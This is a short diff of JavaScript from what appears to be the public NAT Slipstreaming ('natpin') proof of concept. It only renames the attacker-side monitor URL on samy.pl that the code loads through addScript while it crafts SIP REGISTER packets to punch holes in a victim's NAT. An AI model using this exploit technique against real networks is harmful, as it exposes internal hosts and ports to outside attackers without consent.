@@ -392,7 +392,7 @@ function a2h(str)
 }
 
 
-// call from /monitor
+// call from /monitor.php
 function offset(off, data, origoff)
 {
 	clearTimeout(noRespTimer)
@@ -443,7 +443,7 @@ function offset(off, data, origoff)
 				lastOff = off
 
 			log("packet size changed on us, reattempt SIP REGISTER")
-			addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+			addScript('//samy.pl/natpin/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 			attemptPin(fullpkt)
 		}
 	}
@@ -573,7 +573,7 @@ function runpin()
 	fullpkt = s
 
 	// get our sip request from the server, calls offset() if good, otherwise noRespTimer will likely hit
-	addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+	addScript('//samy.pl/natpin/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 
 	// if we don't get request in a few seconds, something wrong...maybe wrong internal ip if safari
 	noRespTimer = setTimeout(noResponse, 5000)
